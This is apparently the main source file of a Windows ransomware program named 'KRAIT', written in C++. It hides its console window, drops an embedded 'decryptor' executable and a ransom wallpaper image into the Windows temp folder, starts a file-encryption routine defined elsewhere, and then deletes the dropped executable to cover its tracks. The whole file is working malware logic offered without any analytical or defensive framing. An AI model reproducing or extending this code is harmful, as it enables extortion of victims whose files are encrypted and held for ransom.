#include "file_scanner.h"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>

void ExtractResource(int resourceId, const std::string& outputPath) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) return;
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hData);
    
    std::ofstream out(outputPath, std::ios::binary);
    out.write((char*)pData, size);
    out.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
    
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string desktop = std::string(desktopPath);
    
    std::string tempExe = "C:\\Windows\\Temp\\KRAIT_DECRYPTOR.exe";
    ExtractResource(101, tempExe);
    
    std::string tempWall = "C:\\Windows\\Temp\\krait.webp";
    ExtractResource(102, tempWall);
    
    FileScanner::StartEncryption();
    
    DeleteFileA(tempExe.c_str());
    
    return 0;
}
